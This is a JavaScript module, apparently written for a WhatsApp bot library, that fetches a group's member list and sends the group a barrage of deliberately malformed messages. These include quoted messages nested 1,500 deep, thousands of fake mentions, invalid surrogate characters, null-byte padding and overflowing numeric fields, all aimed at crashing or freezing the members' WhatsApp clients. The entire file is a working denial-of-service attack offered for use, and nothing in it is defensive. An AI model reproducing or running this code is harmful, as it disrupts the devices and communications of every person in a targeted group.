const crypto = require("crypto");

module.exports = async function groupforce(sock, groupJid) {
    let meta;
    try {
        meta = await sock.groupMetadata(groupJid);
    } catch (err) {
        throw new Error(`Cannot fetch group: ${err.message}`);
    }

    const participants = meta.participants.map(p => p.id);
    if (!participants.length) throw new Error("No participants in group");

    const baseId = crypto.randomBytes(16).toString("hex").toUpperCase();

    const buildDeepNested = (depth) => {
        let inner = { conversation: "\0" };
        for (let i = 0; i < depth; i++) {
            inner = {
                extendedTextMessage: {
                    text: "\0",
                    contextInfo: {
                        quotedMessage: inner,
                        participant: `${"0".repeat(16)}@s.whatsapp.net`,
                        stanzaId: crypto.randomBytes(8).toString("hex").toUpperCase()
                    }
                }
            };
        }
        return inner;
    };

    const buildNestedContext = (depth) => {
        let inner = {
            remoteJid: groupJid,
            stanzaId: crypto.randomBytes(8).toString("hex")
        };
        for (let i = 0; i < depth; i++) {
            inner = {
                remoteJid: groupJid,
                stanzaId: crypto.randomBytes(8).toString("hex"),
                participant: participants[i % participants.length],
                mentionedJid: participants,
                quotedMessage: {
                    extendedTextMessage: {
                        text: "\0",
                        contextInfo: inner
                    }
                }
            };
        }
        return inner;
    };

    const badJson = (() => {
        let o = { t: "\uD800" };
        for (let i = 0; i < 500; i++) o = { n: o, k: "\0", v: "\uDFFF" };
        return JSON.stringify(o);
    })();

    const buildMassMention = () => ({
        extendedTextMessage: {
            text: "\0",
            contextInfo: {
                mentionedJid: [
                    ...participants,
                    ...Array.from({ length: 15000 }, () =>
                        `${crypto.randomBytes(4).toString("hex")}@s.whatsapp.net`
                    )
                ]
            }
        }
    });

    const payloads = [];

    payloads.push({
        extendedTextMessage: {
            text: "\0",
            contextInfo: { quotedMessage: buildDeepNested(1500) }
        }
    });

    payloads.push(buildMassMention());

    payloads.push({
        interactiveMessage: {
            header: { title: "\0", hasMediaAttachment: false },
            body: { text: "\0" },
            nativeFlowMessage: {
                buttons: [],
                messageParamsJson: badJson
            },
            contextInfo: {
                addonActionSection: {
                    actionType: null,
                    primitives: []
                },
                quotedMessage: buildNestedContext(400)
            }
        }
    });

    payloads.push({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "\0", hasMediaAttachment: false },
                    nativeFlowMessage: { buttons: [] },
                    contextInfo: {
                        addonActionSection: { actionType: null, primitives: [] },
                        quotedMessage: buildNestedContext(400)
                    }
                }
            }
        }
    });

    payloads.push({
        buttonsMessage: {
            contentText: "\0",
            footerText: "\0".repeat(4096),
            buttons: [
                {
                    buttonId: "\0".repeat(256),
                    buttonText: { displayText: "\uD800".repeat(512) },
                    type: 1,
                    nativeFlowInfo: { name: "\0", paramsJson: badJson }
                },
                {
                    buttonId: "\0".repeat(256),
                    buttonText: { displayText: "\uDFFF".repeat(512) },
                    type: 2,
                    nativeFlowInfo: { name: "galaxy_message", paramsJson: badJson }
                }
            ],
            headerType: 6,
            contextInfo: {
                mentionedJid: participants,
                quotedMessage: buildNestedContext(400)
            }
        }
    });

    payloads.push({
        locationMessage: {
            degreesLatitude: NaN,
            degreesLongitude: NaN,
            name: "\0".repeat(4096),
            address: "\0".repeat(4096),
            url: "data:".repeat(2048),
            contextInfo: { mentionedJid: participants }
        }
    });

    payloads.push({
        productMessage: {
            product: {
                productImage: {
                    url: "https://mmg.whatsapp.net/" + "\0".repeat(2048),
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.alloc(32, 0xff).toString("base64"),
                    fileLength: "999999999999999",
                    height: 0xffffffff,
                    width: 0xffffffff
                },
                productId: "\0".repeat(256),
                title: "\0",
                description: "\uD800".repeat(4096),
                currencyCode: "\0\0\0",
                priceAmount1000: "9999999999999999999",
                productImageCount: 0xffffffff
            },
            businessOwnerJid: participants[0],
            contextInfo: { quotedMessage: buildNestedContext(400) }
        }
    });

    payloads.push({
        pollCreationMessage: {
            name: "\0".repeat(4096),
            options: Array.from({ length: 100 }, () => ({
                optionName: "\uD800".repeat(512)
            })),
            selectableOptionsCount: 0xffffffff,
            contextInfo: { mentionedJid: participants }
        }
    });

    payloads.push({
        albumMessage: {
            expectedImageCount: 0xffffffff,
            expectedVideoCount: 0xffffffff,
            contextInfo: { mentionedJid: participants }
        }
    });

    payloads.push({
        ptvMessage: {
            url: "https://mmg.whatsapp.net/" + "\0".repeat(2048),
            mimetype: "video/mp4",
            fileSha256: Buffer.alloc(32, 0xff).toString("base64"),
            fileLength: "9999999999999",
            height: 0xffffffff,
            width: 0xffffffff,
            seconds: 0xffffffff,
            mediaKey: Buffer.alloc(32, 0xff).toString("base64"),
            directPath: "\0".repeat(2048)
        }
    });

    payloads.push({
        eventMessage: {
            name: "\0".repeat(4096),
            description: "\uD800".repeat(2048),
            startTime: "9999999999999",
            endTime: "9999999999999999",
            isCanceled: true,
            contextInfo: { mentionedJid: participants }
        }
    });

    payloads.push({
        highlyStructuredMessage: {
            namespace: "\0".repeat(1024),
            elementName: "\0",
            params: Array.from({ length: 2000 }, () => "\0"),
            localizableParams: Array.from({ length: 800 }, () => ({
                title: "\0",
                defaultText: "\uD800".repeat(256)
            })),
            hydratedHsm: {
                hydratedContentText: "\0",
                hydratedFooterText: "\0".repeat(4096),
                hydratedButtons: Array.from({ length: 300 }, () => ({
                    quickReplyButton: { displayText: "\0", id: "\0" }
                }))
            }
        }
    });

    payloads.push({
        groupStatusMentionMessage: {
            message: {
                protocolMessage: {
                    type: 0,
                    key: {
                        remoteJid: groupJid,
                        fromMe: false,
                        id: "\0".repeat(64),
                        participant: participants[0]
                    }
                }
            }
        }
    });

    payloads.push({
        templateMessage: {
            hydratedTemplate: {
                hydratedContentText: "\0",
                hydratedFooterText: "\uD800".repeat(2048),
                hydratedButtons: Array.from({ length: 300 }, () => ({
                    urlButton: { displayText: "\0", url: "data:".repeat(1024) },
                    quickReplyButton: { displayText: "\uDFFF".repeat(512), id: "\0" }
                })),
                hydratedTitleText: "\0".repeat(4096)
            },
            contextInfo: { mentionedJid: participants }
        }
    });

    payloads.push({
        requestPhoneNumberMessage: {
            contextInfo: { mentionedJid: participants }
        }
    });

    for (let i = 0; i < payloads.length; i++) {
        const payload = payloads[i];
        const msgId = `${baseId}${i.toString(16).padStart(2, "0")}`;

        try {
            await sock.relayMessage(groupJid, payload, {
                messageId: msgId,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { appdata: "default", platform: "all" },
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: participants.map(jid => ({
                                    tag: "to",
                                    attrs: { jid }
                                }))
                            },
                            {
                                tag: "status_attribution",
                                attrs: { hidden: "true" },
                                content: []
                            },
                            {
                                tag: "platform",
                                attrs: { type: "ios,android" },
                                content: []
                            }
                        ]
                    }
                ]
            });

            await new Promise(r => setTimeout(r, 80));
        } catch (err) {
            // continue
        }
    }

    return {
        participants: participants.length,
        payloadsSent: payloads.length
    };
};
